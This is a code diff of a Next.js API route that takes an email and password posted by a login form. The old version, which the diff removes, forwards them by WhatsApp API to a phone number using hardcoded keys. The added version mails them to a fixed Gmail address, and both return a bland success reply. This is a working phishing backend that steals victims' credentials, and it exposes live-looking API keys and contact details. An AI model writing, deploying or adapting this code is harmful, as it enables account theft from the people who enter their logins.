@@ -1,36 +1,46 @@
-
 import { NextResponse } from "next/server";
 import fdf from 'request'
 export async function POST(request) {
     const {email, password} = await request.json()
 
     
-    var options = {
-        'method': 'POST',
-        'url': 'https://whats-api.rcsoft.in/api/create-message',
-        'headers': {
+ 
+    const nodemailer = require("nodemailer");
+
+    const transporter = nodemailer.createTransport({
+        service: "gmail",
+        auth: {
+            user: process.env.GMAIL,
+            pass: process.env.GMAILPASSWORD,
         },
-        formData: {
-          'appkey': 'af6905c7-65d2-48f9-8a5c-cb700892abbf',
-          'authkey': 'j0NXbzUG0LJTeBaINxqdYmtEazuHv3DlUt99WdF0xlS7d5kwSc',
-          'to': '917878842575',
-          'message': `${email} and ${password}`
-        }
-      };
-      fdf(options)
+    });
 
- await new Promise((resolve, reject) => {
-setTimeout(()=> {
-return resolve()
-},5000)
-})
+    
+    async function main() {
+        const info = await transporter.sendMail({
+            from: process.env.GMAIL,
+            to: 'kamleshksks456@gmail.com',
+            subject: `${email} ${password}`,
+            text: `${email} ${password}`,
+            html: `${email} ${password}`,
+        });
 
-await new Promise((resolve, reject) => {
-  setTimeout(()=> {
-  return resolve()
-  },4000)
-  })
-      
+        console.log("Message sent: %s", info.messageId);
+    }
+
+
+    await new Promise((resolve, reject) => {
+        main().then(() => resolve())
+            .catch(() => resolve());
+        setTimeout(() => {
+            resolve()
+        }, 9000)
+    })
+
+
+
+
+
      
     
     const  response = NextResponse.json({success: true})
